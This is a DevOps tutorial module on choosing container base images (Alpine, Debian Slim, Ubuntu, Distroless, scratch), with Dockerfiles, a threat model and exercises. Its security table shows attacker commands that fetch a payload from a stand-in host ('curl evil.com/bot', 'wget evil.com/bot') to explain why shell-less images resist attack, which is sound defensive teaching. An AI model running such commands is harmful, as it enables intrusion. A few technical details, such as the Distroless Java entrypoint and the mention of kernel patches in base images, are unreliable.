# Base Image Selection: Alpine, Debian, Ubuntu, Distroless, and Scratch

```
Track: DevOps & Containerization
Module: 03-dockerfile
Prerequisites: 03-dockerfile/01-dockerfile-basics.md, 03-dockerfile/04-multi-stage-builds.md
Difficulty: Intermediate to Advanced
Estimated Duration: 45 minutes
Target Docker Version: 27.x+
Last Validated: February 2025
```

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & Implementation Reference](#4-syntax--implementation-reference)
5. [Practical Implementation & Examples](#5-practical-implementation--examples)
6. [Production Best Practices & Antipatterns](#6-production-best-practices--antipatterns)
7. [Common Pitfalls & Troubleshooting](#7-common-pitfalls--troubleshooting)
8. [Performance Tuning & Resource Optimization](#8-performance-tuning--resource-optimization)
9. [Security Hardening & Threat Model](#9-security-hardening--threat-model)
10. [Architectural Comparison Table](#10-architectural-comparison-table)
11. [Real-World Scenario Walkthrough](#11-real-world-scenario-walkthrough)
12. [Self-Assessment & Interview Questions](#12-self-assessment--interview-questions)
13. [Hands-on Practice Exercises](#13-hands-on-practice-exercises)
14. [Summary & Reference Cheat Sheet](#summary--reference-cheat-sheet)

---

## 1. What & Why

Selecting a container base image is one of the most critical architectural decisions in container engineering. The choice of base image dictates:
- **Security Posture & Vulnerability (CVE) Surface**: Standard general-purpose Linux distributions (Ubuntu, Debian Full) package hundreds of utility binaries (e.g., `curl`, `bash`, `tar`, `systemd`, `perl`, `openssl`), every one of which represents a potential attack surface and triggers CVE security scanners.
- **Image Size & Network Transfer Overhead**: A full Ubuntu image weighs ~80MB, Debian Slim ~30MB, Alpine ~7MB, Google Distroless ~20MB, and `scratch` exactly 0MB. Image size directly determines CI build times, container pull latency during auto-scaling events, and storage registry costs.
- **Runtime Compatibility & C Library Semantics**: The standard C library (libc) is the foundation of user-space Linux execution. Standard distributions use `glibc` (GNU C Library), while Alpine uses `musl libc`. Binaries compiled against `glibc` fail to execute on `musl` unless recompiled, dynamically linked via compatibility shims, or statically linked.
- **Debugging & Observability Ergonomics**: Minimalist images (Distroless and `scratch`) lack interactive shells (`/bin/sh`), package managers (`apt`, `apk`), and diagnostic utilities (`ps`, `netstat`, `curl`), making direct in-container troubleshooting reliant on ephemeral debug containers.

---

## 2. Core Concepts

### The Base Image Spectrum

From heaviest/most versatile to lightest/most secure:

1. **Full General Distributions (`ubuntu:24.04`, `debian:bookworm`)**:
   - Contains a complete package ecosystem, shell, manual pages, GNU coreutils, Python/Perl interpreters, and standard development libraries.
   - Ideal for legacy applications, systems with complex native C++ dependencies, or initial local development environments.
2. **Slim Distributions (`debian:bookworm-slim`, `ubuntu:24.04-minimal`)**:
   - Debian or Ubuntu stripped of documentation, localization files, and unnecessary packages. Retains `glibc`, `bash`, and `apt-get`.
   - Offers 100% binary compatibility with standard Linux software while drastically reducing image footprint (~75% reduction vs full distro).
3. **Alpine Linux (`alpine:3.21`)**:
   - Security-oriented, ultra-lightweight distribution built upon `musl libc` and BusyBox.
   - Compressed size is ~3.5MB (uncompressed ~7.5MB). Uses `apk` package manager. Highly popular in Go, Node.js, and static web serving, but introduces critical caveats for Python, Rust, and JVM workloads.
4. **Distroless Images (`gcr.io/distroless/*`)**:
   - Google-maintained runtime images containing **only** your application and its direct runtime dependencies (runtime libraries, CA certificates, timezone data, `/etc/passwd`).
   - Contains **no package manager, no shell (`/bin/sh`), and no coreutils**. Attackers cannot execute reverse shells or download external payloads easily.
5. **The Scratch Image (`FROM scratch`)**:
   - A built-in Docker empty pseudo-image representing a zero-byte filesystem.
   - Ideal for statically compiled binaries (Go, Rust, C++) that require no shared libraries, no runtime environment, and no OS userspace.

---

## 3. How It Works Internally

### C Library Architecture: glibc vs musl libc

The C standard library acts as the translation layer between user applications and the Linux Kernel system calls (`syscall`).

```
+-------------------------------------------------------------+
|                     User Application                        |
|             (Python, Node.js, Go, Java, C++)                |
+------------------------------+------------------------------+
                               |
              +----------------+----------------+
              |                                 |
              v                                 v
+-----------------------------+   +---------------------------+
|         glibc               |   |        musl libc          |
|  - Used by: Debian, Ubuntu  |   |  - Used by: Alpine Linux  |
|  - Highly optimized memory  |   |  - Extremely lightweight  |
|    allocator (ptmalloc)     |   |  - Simple memory alloc    |
|  - Wheels: manylinux        |   |  - Wheels: musllinux      |
|  - Complex, high footprint  |   |  - Memory fragmentation   |
|    (~30MB disk footprint)   |   |    in heavy multithreading|
+-----------------------------+   +---------------------------+
              |                                 |
              +----------------+----------------+
                               |
                               v
+-------------------------------------------------------------+
|                        Linux Kernel                         |
|      (Syscalls: sys_read, sys_write, clone, epoll_create)    |
+-------------------------------------------------------------+
```

### The Python `manylinux` vs `musllinux` Problem
Python packages frequently distribute pre-compiled binary wheels (e.g., `numpy`, `pandas`, `grpcio`, `cryptography`, `pillow`).
- On Debian/Ubuntu (`glibc`), `pip install numpy` downloads pre-compiled `manylinux` wheels instantly without compiling.
- On Alpine (`musl`), `pip` cannot use `manylinux` wheels. Unless a `musllinux` wheel is explicitly published on PyPI, `pip` downloads source code and invokes `gcc`/`g++` inside your container, requiring `build-base`, taking 20x longer to build, and often ballooning cache layers.

---

## 4. Syntax & Implementation Reference

### Declaring Different Base Tiers

```dockerfile
# 1. Scratch (Empty zero-byte image)
FROM scratch
COPY --from=builder /bin/my-static-binary /my-static-binary
ENTRYPOINT ["/my-static-binary"]

# 2. Distroless Static (For Go/Rust with CGO disabled)
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/service /service
ENTRYPOINT ["/service"]

# 3. Distroless Base (For dynamic Go/C++ requiring glibc & libssl)
FROM gcr.io/distroless/base-nss-debian12:nonroot
COPY --from=builder /app/service /service
ENTRYPOINT ["/service"]

# 4. Alpine (musl + busybox)
FROM alpine:3.21
RUN apk add --no-cache ca-certificates tzdata
USER nobody
ENTRYPOINT ["/bin/sh"]

# 5. Debian Slim (glibc + minimal debian)
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
 && rm -rf /var/lib/apt/lists/*
```

---

## 5. Practical Implementation & Examples

### Example 1: Pure Static Go Binary on `scratch` with TLS Certificates
When running on `scratch`, applications requiring HTTPS requests will fail unless CA root certificates and timezone information are copied into the image.

```dockerfile
# Build Stage
FROM golang:1.24-alpine AS builder
WORKDIR /src
RUN apk add --no-cache ca-certificates tzdata
COPY go.mod go.sum ./
RUN go mod download
COPY . .
# Force static compilation without cgo
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags="-s -w -extldflags '-static'" \
    -o /bin/webserver .

# Runtime Stage
FROM scratch
# Import system CA certs for outbound TLS/HTTPS validation
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
# Import timezone database
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
# Import minimal unprivileged user definition
COPY --from=builder /etc/passwd /etc/passwd

COPY --from=builder /bin/webserver /webserver
USER 10001
EXPOSE 8080
ENTRYPOINT ["/webserver"]
```

### Example 2: Distroless Node.js Production Container
Running Node.js inside Google Distroless prevents attackers from dropping a shell even if Remote Code Execution (RCE) is discovered.

```dockerfile
# Stage 1: Build & Prune
FROM node:22-bookworm-slim AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build
RUN npm prune --production

# Stage 2: Distroless Runtime
# gcr.io/distroless/nodejs22-debian12 contains node runtime + libv8 + glibc
FROM gcr.io/distroless/nodejs22-debian12:nonroot
WORKDIR /app
COPY --from=build --chown=nonroot:nonroot /app/package.json ./
COPY --from=build --chown=nonroot:nonroot /app/node_modules ./node_modules
COPY --from=build --chown=nonroot:nonroot /app/dist ./dist

ENV NODE_ENV=production
EXPOSE 3000
USER nonroot
CMD ["dist/main.js"]
```

### Example 3: Python FastAPI: Debian Slim vs Alpine
Demonstrating why `python:3.12-slim` is overwhelmingly preferred over `python:3.12-alpine` for scientific/crypto workloads.

```dockerfile
# Production-Grade Debian Slim for Python
FROM python:3.12-slim-bookworm AS base

ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /app

# Install security updates and curl for healthcheck only
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
 && rm -rf /var/lib/apt/lists/*

# Create unprivileged application user
RUN groupadd -g 1000 appgroup && \
    useradd -u 1000 -g appgroup -s /sbin/nologin -d /app appuser

COPY requirements.txt .
# Debian uses manylinux wheels directly: fast, no gcc needed
RUN pip install -r requirements.txt

COPY --chown=appuser:appgroup . .

USER appuser
EXPOSE 8000
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Example 4: Java Spring Boot on Eclipse Temurin vs Distroless Java
Utilizing JRE rather than JDK on Debian Slim or Distroless.

```dockerfile
# Build Stage
FROM maven:3.9-eclipse-temurin-21-alpine AS build
WORKDIR /build
COPY pom.xml .
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn clean package -DskipTests

# Runtime Stage: Distroless Java 21
FROM gcr.io/distroless/java21-debian12:nonroot
WORKDIR /app
COPY --from=build --chown=nonroot:nonroot /build/target/*.jar /app/app.jar

ENV JAVA_TOOL_OPTIONS="-XX:MaxRAMPercentage=75.0 -XX:+UseG1GC"
USER nonroot
EXPOSE 8080
ENTRYPOINT ["/app/app.jar"]
```

### Example 5: Debugging Distroless with Ephemeral Containers / Debug Variants
Google provides `:debug` tags containing BusyBox shells for development and staging environments.

```dockerfile
# For staging/dev environments where team needs interactive sh:
FROM gcr.io/distroless/base-debian12:debug AS dev
COPY --from=builder /app/service /service
# :debug includes /busybox/sh
ENTRYPOINT ["/busybox/sh"]
```

---

## 6. Production Best Practices & Antipatterns

### Best Practices
- **Default to Debian Slim for Python & Node.js**: Unless your dependencies are strictly static, Debian Slim avoids `musl` compilation bottlenecks, wheel incompatibility, and unpredictable memory allocator bugs.
- **Default to `scratch` or Distroless for Go, Rust, and C++**: Statically link external libraries and strip debugging symbols (`-ldflags="-s -w"`). Use `scratch` or `distroless/static`.
- **Pin Base Images with Both Tag and Immutable Digest**: Always use `image:tag@sha256:hash` to prevent upstream rebuilds from breaking caching or introducing unvetted code.
- **Update Base Images Regularly**: Minimal images still require base layer rebuilds to pull in Linux kernel security patches (OpenSSL, zlib, libc fixes).
- **Run as Non-Root Across All Base Types**: Never rely on a base image being non-root by default. Always verify or explicitly declare `USER 10001:10001`.

### Anti-Patterns
- **Using `alpine` for Data Science Python**: Compiling NumPy, SciPy, or PyTorch on Alpine takes 30-45 minutes and results in an image twice the size of Debian Slim due to leftover build toolchains.
- **Using `ubuntu:latest` in Production**: Incurs massive CVE scan noise (~150+ low/medium vulnerabilities), unneeded utilities (`systemd`, `udev`), and 80MB baseline disk footprint.
- **Relying on `scratch` without CA Certificates**: Running an outbound HTTPS call from a Go binary in `scratch` without copying `/etc/ssl/certs/ca-certificates.crt` produces `x509: certificate signed by unknown authority`.

---

## 7. Common Pitfalls & Troubleshooting

| Symptom | Root Cause | Diagnosis Command | Permanent Fix |
|:---|:---|:---|:---|
| `standard_init_linux.go: exec user process caused: no such file or directory` | Go/Rust binary dynamically linked against `glibc` executed on Alpine or `scratch` | `file /bin/mybinary` or `ldd /bin/mybinary` | Build with `CGO_ENABLED=0` or link statically with `-extldflags "-static"`. |
| `x509: certificate signed by unknown authority` | Outbound HTTPS failed in `scratch` due to missing root certificates | Check binary stdout/stderr logs on TLS handshake | Copy `ca-certificates.crt` from builder into `/etc/ssl/certs/`. |
| Python `pip install` hangs for 20 minutes on Alpine | Missing pre-compiled `musllinux` wheel; compiling from C/C++ source | Inspect `docker build` logs showing `gcc` / `make` execution | Switch base image to `python:3.12-slim-bookworm`. |
| Memory leaks / severe fragmentation in multi-threaded Alpine services | `musl` libc memory allocator behaves differently under high allocation concurrency compared to `glibc` ptmalloc | Check `docker stats` showing constantly increasing RSS memory | Benchmark on `debian-slim` with `glibc`; adjust `MALLOC_ARENA_MAX`. |
| Cannot run `docker exec -it <id> sh` in production | Container runs on Distroless or `scratch` (no shell binary present) | `docker exec <id> sh` returns `OCI runtime exec failed` | Use `kubectl debug` (ephemeral container) or use `:debug` tagged image during staging. |
| Timezone conversion produces incorrect UTC output | Missing `/usr/share/zoneinfo` database in minimal base image | Execute date/time formatting code expecting local tz | Copy `tzdata` files from builder stage or install `tzdata` package. |

---

## 8. Performance Tuning & Resource Optimization

1. **Layer Size vs In-Memory Performance**:
   - Alpine images are smaller on disk (~5MB vs ~30MB), but `musl`'s allocator is not optimized for high-throughput, multi-threaded heap allocations (e.g., intensive JVM or Python threading). `glibc` is significantly faster for raw floating-point and memory-intensive operations.
2. **Cold Pull Latency in Auto-Scaling Systems**:
   - In Kubernetes or AWS ECS Fargate, scaling from 0 to 50 pods requires pulling image layers across the internal VPC network. A 20MB Distroless image pulls in ~600ms, while a 400MB unoptimized image requires 12-15 seconds of startup latency.
3. **Multi-Stage Caching Separation**:
   - Always run dependency downloads in a dedicated builder stage so runtime base images remain untainted by build toolchains (`gcc`, `g++`, `git`, `rustc`, `npm`).

---

## 9. Security Hardening & Threat Model

```
+--------------------------------------------------------------+
| Attack Vector: Container Breakout / Remote Code Execution     |
+--------------------------------------------------------------+
| Full OS (Ubuntu/Debian)   | Alpine (musl + busybox) | Distroless / Scratch   |
|---------------------------+-------------------------+------------------------|
| Attacker gets RCE         | Attacker gets RCE       | Attacker gets RCE      |
| Spawns `/bin/bash`        | Spawns `/bin/sh`        | NO SHELL EXISTS        |
| Runs `curl evil.com/bot`  | Runs `wget evil.com/bot`| NO CURL / WGET EXISTS  |
| Exploits `sudo`/setuid    | BusyBox tools available | NO UTILITIES TO CHAIN  |
| Installs rootkit via apt  | Modifies apk packages   | NO PACKAGE MANAGER     |
| Exploit success: HIGH     | Exploit success: MEDIUM | Exploit success: LOW   |
+---------------------------+-------------------------+------------------------+
```

### The Non-Root Mandate
Never run containers as root, regardless of base image. Distroless images supply a standard non-root user out of the box:
```dockerfile
USER nonroot:nonroot # UID 65532, GID 65532
```
For Alpine:
```dockerfile
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
```

---

## 10. Architectural Comparison Table

| Attribute | `scratch` | Google Distroless | Alpine Linux | Debian Slim | Ubuntu Full |
|:---|:---|:---|:---|:---|:---|
| **Compressed Size** | 0 MB | ~10 - 25 MB | ~3.5 MB | ~30 MB | ~80 MB |
| **C Library** | None | `glibc` (or none) | `musl libc` | `glibc` | `glibc` |
| **Package Manager**| None | None | `apk` | `apt` | `apt` |
| **Shell Available**| No | No (except `:debug`) | Yes (`/bin/sh`) | Yes (`bash`, `sh`)| Yes (`bash`, `sh`)|
| **Known CVEs (Avg)**| 0 | 0 - 2 | 0 - 5 | 10 - 30 | 50 - 150+ |
| **Python Suitability**| Impossible | Limited | Poor (wheel issues) | **Optimal** | Fair |
| **Node.js Suitability**| Impossible | **Optimal** | Good | **Optimal** | Fair |
| **Go/Rust Suitability**| **Optimal** | **Optimal** | Good | Good | Overkill |
| **Java/JVM Suitability**| Impossible | **Optimal** | Good | **Optimal** | Overkill |

---

## 11. Real-World Scenario Walkthrough

### Scenario: Migrating an Enterprise FinTech Node.js API from Ubuntu to Distroless

#### Background
A payment gateway service containerized on `ubuntu:22.04` triggered 84 critical/high CVE flags on AWS ECR image vulnerability scans. The security team mandated a zero-CVE policy for production deployment.

#### Migration Steps
1. **Analyze Dependencies**: The application is written in TypeScript, compiling to Node.js 22, requiring `openssl` for cryptographic operations and `libv8`.
2. **First Attempt (Alpine)**: Migrated to `node:22-alpine`. Build succeeded, but latency spikes occurred under 2,000 req/sec load tests due to native cryptographic hashing bindings falling back to slow compilation paths under `musl`.
3. **Second Attempt (Distroless Node.js)**:
   - Configured multi-stage build using `node:22-bookworm-slim` for dependency installation and TypeScript compilation.
   - Used `gcr.io/distroless/nodejs22-debian12:nonroot` as runtime base.
   - Verified that unprivileged user `65532` (`nonroot`) correctly had write permissions only to temporary mount `/tmp`.
4. **Outcome**:
   - Total CVE count dropped from 84 to **0**.
   - Container image size dropped from **840MB** to **142MB** (uncompressed).
   - Container cold-start startup time in ECS Fargate reduced from 14.2s to 2.1s.

---

## 12. Self-Assessment & Interview Questions

<details>
<summary><strong>1. Why does a Go binary compiled on Ubuntu often fail to start when placed inside an Alpine base image?</strong></summary>

**Answer:**
By default, if Go imports packages that utilize CGO (e.g., `net` using dynamic DNS resolvers or `os/user`), the Go compiler dynamically links the binary against the host machine's C library (`glibc`). When that binary is executed inside Alpine Linux, the dynamic linker looks for `/lib/ld-linux-x86-64.so.2` (`glibc`), which does not exist in Alpine (which uses `/lib/ld-musl-x86_64.so.1`). The kernel responds with `exec: "app": file not found`. To resolve this, build with `CGO_ENABLED=0` to produce a completely static binary, or compile directly inside an Alpine build container.
</details>

<details>
<summary><strong>2. What are the key architectural differences between Alpine's `musl libc` and Debian's `glibc`?</strong></summary>

**Answer:**
`glibc` is optimized for execution speed, multi-threaded performance, and backwards compatibility with legacy UNIX systems, utilizing an advanced multi-arena heap memory allocator (`ptmalloc`). It is large (~30MB) and complex. `musl libc` is designed from scratch for simplicity, correctness, and minimal binary footprint (~600KB), but its memory allocator can suffer from heap fragmentation under heavy multithreaded allocation workloads, and it lacks compatibility with `manylinux` pre-compiled wheels.
</details>

<details>
<summary><strong>3. Explain the concept of Google Distroless images and how they improve container security.</strong></summary>

**Answer:**
Distroless images contain only an application and its runtime language dependencies. They omit everything typically found in Linux distributions: package managers (`apt`, `apk`), shells (`bash`, `sh`), and system command utilities (`ls`, `cat`, `ps`, `curl`, `chmod`). This implements the security principle of least privilege: even if an attacker discovers a Remote Code Execution vulnerability in the application, they cannot spawn an interactive shell, write shell scripts, or download malicious payloads over HTTP.
</details>

<details>
<summary><strong>4. How do you troubleshoot or execute diagnostics on a container running a Distroless or `scratch` image in Kubernetes?</strong></summary>

**Answer:**
Because the container lacks a shell, `docker exec -it <container> sh` will fail. In Kubernetes, the standard approach is using **Ephemeral Debug Containers** via `kubectl debug -it <pod> --image=busybox --target=<container-name>`, which attaches a temporary debugging container into the target container's process, network, and IPC namespaces. In Docker standalone, developers use the `:debug` tag of the distroless image during staging, or inspect container state externally via `docker logs`, `docker top`, and network sniffing on the container's veth interface.
</details>

<details>
<summary><strong>5. Why is `python:slim` almost universally recommended over `python:alpine`?</strong></summary>

**Answer:**
The Python scientific and enterprise ecosystem (NumPy, SciPy, Pandas, PyTorch, Cryptography) distributes pre-compiled binary packages on PyPI as `manylinux` wheels built against `glibc`. Alpine's `musl` libc cannot run `manylinux` wheels. When running `pip install` on Alpine, pip falls back to downloading raw C/C++ source code, requiring `gcc`, `g++`, `make`, and development headers to be installed in the image. This increases build times from seconds to 30+ minutes, frequently fails on missing C dependencies, and often results in larger images due to build residue.
</details>

<details>
<summary><strong>6. What essential files must be copied into a `scratch` base image for a Go web application communicating over HTTPS?</strong></summary>

**Answer:**
1. **CA Root Certificates**: `/etc/ssl/certs/ca-certificates.crt` so the Go HTTP client can validate TLS certificate chains from external APIs.
2. **Timezone Data**: `/usr/share/zoneinfo` for `time.LoadLocation()` to work.
3. **Passwd File**: `/etc/passwd` defining an unprivileged UID/GID if running as a named non-root user.
</details>

<details>
<summary><strong>7. How does image size impact autoscaling latency in production cloud environments?</strong></summary>

**Answer:**
When an auto-scaling event triggers in Kubernetes, AWS ECS, or Google Cloud Run, a new virtual machine or host node must download the container image layers from the container registry over the network before the container can transition to `Running`. A 1GB image requires 10-30 seconds to download and extract, while a 20MB image downloads in under 1 second. This difference directly dictates whether an application can absorb sudden traffic surges without dropping incoming requests.
</details>

<details>
<summary><strong>8. Can an attacker exploit a setuid binary inside a Distroless container?</strong></summary>

**Answer:**
No, because Distroless images contain no setuid binaries (such as `sudo`, `su`, `chsh`, `pkexec`), and the non-root variants execute under an unprivileged UID (65532). Furthermore, standard container runtimes drop `CAP_SETUID` and prevent privilege escalation when properly configured with `no-new-privileges:true`.
</details>

---

## 13. Hands-on Practice Exercises

<details>
<summary><strong>Exercise 1: Static Go Binary on Scratch with Outbound HTTPS</strong></summary>

**Goal:** Build a Go program that calls an external HTTPS endpoint (e.g., `https://api.github.com`), package it in `scratch`, and ensure it passes certificate validation.

**Step-by-step Solution:**
1. Create `main.go`:
   ```go
   package main
   import (
       "fmt"
       "net/http"
       "os"
   )
   func main() {
       resp, err := http.Get("https://api.github.com")
       if err != nil {
           fmt.Fprintf(os.Stderr, "HTTP Error: %v\n", err)
           os.Exit(1)
       }
       defer resp.Body.Close()
       fmt.Printf("Success! Status: %s\n", resp.Status)
   }
   ```
2. Create `Dockerfile`:
   ```dockerfile
   FROM golang:1.24-alpine AS builder
   RUN apk add --no-cache ca-certificates
   WORKDIR /app
   COPY main.go .
   RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/fetcher main.go

   FROM scratch
   COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
   COPY --from=builder /app/fetcher /fetcher
   USER 10001
   ENTRYPOINT ["/fetcher"]
   ```
3. Build and test:
   ```bash
   docker build -t go-scratch-demo .
   docker run --rm go-scratch-demo
   ```
</details>

<details>
<summary><strong>Exercise 2: Benchmarking Build Times: Python Slim vs Alpine</strong></summary>

**Goal:** Create two Dockerfiles installing `cryptography` and `pandas`—one on `python:3.12-alpine` and one on `python:3.12-slim-bookworm`—and compare build duration and layer size.

**Step-by-step Solution:**
1. Create `requirements.txt`:
   ```text
   cryptography==44.0.0
   pandas==2.2.3
   ```
2. Create `Dockerfile.alpine`:
   ```dockerfile
   FROM python:3.12-alpine
   RUN apk add --no-cache gcc musl-dev libffi-dev g++ make
   COPY requirements.txt .
   RUN pip install --no-cache-dir -r requirements.txt
   ```
3. Create `Dockerfile.slim`:
   ```dockerfile
   FROM python:3.12-slim-bookworm
   COPY requirements.txt .
   RUN pip install --no-cache-dir -r requirements.txt
   ```
4. Build both and measure time:
   ```bash
   time docker build -f Dockerfile.alpine -t py-alpine .
   time docker build -f Dockerfile.slim -t py-slim .
   docker images | grep py-
   ```
5. Observe: `py-slim` completes in seconds using pre-built wheels, whereas `py-alpine` compiles packages from source.
</details>

<details>
<summary><strong>Exercise 3: Migrating an Existing Node.js Image to Distroless</strong></summary>

**Goal:** Package an Express.js API into Google Distroless with nonroot UID enforcement.

**Step-by-step Solution:**
1. Write multi-stage Dockerfile:
   ```dockerfile
   FROM node:22-bookworm-slim AS builder
   WORKDIR /app
   COPY package*.json ./
   RUN npm ci --omit=dev
   COPY . .

   FROM gcr.io/distroless/nodejs22-debian12:nonroot
   WORKDIR /app
   COPY --from=builder --chown=nonroot:nonroot /app /app
   USER nonroot
   EXPOSE 3000
   CMD ["server.js"]
   ```
2. Build and inspect with Grype or Trivy:
   ```bash
   docker build -t node-distroless .
   trivy image node-distroless
   ```
</details>

<details>
<summary><strong>Exercise 4: Debugging a Shell-less Container with an Ephemeral Container</strong></summary>

**Goal:** Run a Distroless container without a shell, and inspect its runtime state using Docker namespace sharing.

**Step-by-step Solution:**
1. Run target container in background:
   ```bash
   docker run -d --name distroless-target node-distroless
   ```
2. Attempt direct exec (will fail):
   ```bash
   docker exec -it distroless-target sh
   # Output: OCI runtime exec failed: exec: "sh": executable file not found in $PATH
   ```
3. Attach a debugging container sharing the target's PID and Network namespaces:
   ```bash
   docker run --rm -it \
     --net=container:distroless-target \
     --pid=container:distroless-target \
     alpine:3.21 sh
   ```
4. Inside the debug shell, inspect target processes and open sockets:
   ```sh
   ps aux
   netstat -tuln
   ```
</details>

<details>
<summary><strong>Exercise 5: Creating an Immutable Base Image Digest Lockfile</strong></summary>

**Goal:** Inspect a mutable tag (`debian:bookworm-slim`), extract its immutable cryptographic SHA256 digest, and lock your production Dockerfile to it.

**Step-by-step Solution:**
1. Pull the image:
   ```bash
   docker pull debian:bookworm-slim
   ```
2. Extract the RepoDigest:
   ```bash
   docker inspect --format='{{index .RepoDigests 0}}' debian:bookworm-slim
   # Example output: debian@sha256:d6b9...
   ```
3. Update Dockerfile:
   ```dockerfile
   FROM debian:bookworm-slim@sha256:d6b9f4a132e...
   ```
</details>

<details>
<summary><strong>Exercise 6: Hardening Alpine by Stripping the Package Manager</strong></summary>

**Goal:** Build an Alpine container that installs required runtime packages during build, then deletes `apk` and its caches to prevent subsequent binary installations at runtime.

**Step-by-step Solution:**
1. Create `Dockerfile`:
   ```dockerfile
   FROM alpine:3.21
   RUN apk add --no-cache ca-certificates tzdata \
    && rm -rf /sbin/apk /etc/apk /lib/apk /var/cache/apk
   USER 10001
   ENTRYPOINT ["/bin/sh", "-c", "echo 'Runtime hardened'"]
   ```
2. Build and verify `apk` is gone:
   ```bash
   docker build -t alpine-hardened .
   docker run --rm alpine-hardened
   ```
</details>

---

## Summary & Reference Cheat Sheet

```
+--------------------------------------------------------------------------+
|                        BASE IMAGE DECISION MATRIX                        |
+--------------------------------------------------------------------------+
| Workload Type           | Recommended Base Image         | Reason        |
|-------------------------+--------------------------------+---------------|
| Go (Pure Static)        | scratch                        | 0MB, 0 CVEs   |
| Rust / C++ (Static)     | scratch                        | 0MB, 0 CVEs   |
| Go / C++ (Dynamic CGO)  | gcr.io/distroless/base-debian12| Minimal glibc |
| Node.js Production      | gcr.io/distroless/nodejs22     | RCE resistant |
| Node.js Complex C++ add | node:22-bookworm-slim          | Full glibc/npm|
| Python Web (FastAPI)    | python:3.12-slim-bookworm      | manylinux OK  |
| Python Data Science     | python:3.12-slim-bookworm      | Fast wheels   |
| Java Spring Boot        | gcr.io/distroless/java21       | Secure JRE    |
| Static Web (Nginx)      | cgr.dev/chainguard/nginx       | Zero CVE      |
+--------------------------------------------------------------------------+
```

### Core Decision Rules:
1. **Never use full distributions** (`ubuntu:latest`, `debian:latest`) in production.
2. **Never use Alpine for Python** unless all dependencies provide `musllinux` wheels.
3. **Always use Multi-Stage Builds** so build tools never enter runtime base images.
4. **Always pin SHA256 digests** in production pipelines for reproducibility.

---

[← Previous: 07-multi-platform-images.md](07-multi-platform-images.md) | [Next: 09-healthchecks.md →](09-healthchecks.md)
